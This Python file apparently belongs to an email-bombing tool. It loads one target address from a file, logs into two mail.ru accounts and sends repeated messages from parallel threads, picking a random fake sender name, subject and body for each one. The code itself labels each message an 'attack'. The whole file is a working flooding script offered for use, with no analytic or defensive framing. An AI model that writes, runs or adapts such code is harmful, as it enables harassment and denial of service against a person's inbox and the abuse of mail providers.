import smtplib as root
from random import *
from threading import Thread
from Module_Mail.mail_collection import get_my_login, get_my_password
from Module_Mail.subject import SUBJECT
from Module_Mail.messages import MESSAGE
from Module_Mail.changelings import CHANGELINGS
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

PROTOCOL = 'smtp.mail.ru'
PORT = 587

file = open('Module_Mail/mail.txt', 'r')
mail = file.read()
file.close()


class Module_sync:
    try:
        ID_1 = 1
        login_1 = get_my_login(ID_1)
        password_1 = get_my_password(ID_1)
    except:
        print(f'[-] Модуль {ID_1} небыл задействован')
    try:
        ID_2 = 2
        login_2 = get_my_login(ID_2)
        password_2 = get_my_password(ID_2)
    except:
        print(f'[-] Модуль {ID_2} небыл задействован')

def mail_module_1(number_of_attacks):
    try:
        ID = 1
        number_attack = 1
        module_name = f'Module {ID}'
        print(f'[~] Подключение к модулю {ID}')
        while number_attack <= number_of_attacks:
            server = root.SMTP(PROTOCOL, PORT)
            server.starttls()
            login = Module_sync.login_1
            password = Module_sync.password_1
            FROM = f'{choice(CHANGELINGS)} <'+login+'>'
            msg = MIMEMultipart('alternative')
            msg['From'] = FROM
            msg['To'] = mail
            msg['Subject'] = choice(SUBJECT)
            msg['Return-Path'] = login
            message = MIMEText(choice(MESSAGE))
            msg.attach(message)
            server.login(login, password)
            server.sendmail(login, mail, msg.as_string())
            print(f'[+] {module_name} Сообщение {number_attack} отправлено!')
            number_attack += 1
    except:
        print(f'[!] Ошибка отправки в модуле {ID}')
def mail_module_2(number_of_attacks):
    try:
        ID = 2
        number_attack = 1
        module_name = f'Module {ID}'
        print(f'[~] Подключение к модулю {ID}')
        while number_attack <= number_of_attacks:
            server = root.SMTP(PROTOCOL, PORT)
            server.starttls()
            login = Module_sync.login_2
            password = Module_sync.password_2
            FROM = f'{choice(CHANGELINGS)} <'+login+'>'
            msg = MIMEMultipart('alternative')
            msg['From'] = FROM
            msg['To'] = mail
            msg['Subject'] = choice(SUBJECT)
            msg['Return-Path'] = login
            message = MIMEText(choice(MESSAGE))
            msg.attach(message)
            server.login(login, password)
            server.sendmail(login, mail, msg.as_string())
            print(f'[+] {module_name} Сообщение {number_attack} отправлено!')
            number_attack += 1
    except:
        print(f'[!] Ошибка отправки в модуле {ID}')

async def send_start(number_of_attacks):
    module_1 = Thread(target=mail_module_1, args=[number_of_attacks])
    module_2 = Thread(target=mail_module_2, args=[number_of_attacks])
    module_1.start()
    module_2.start()
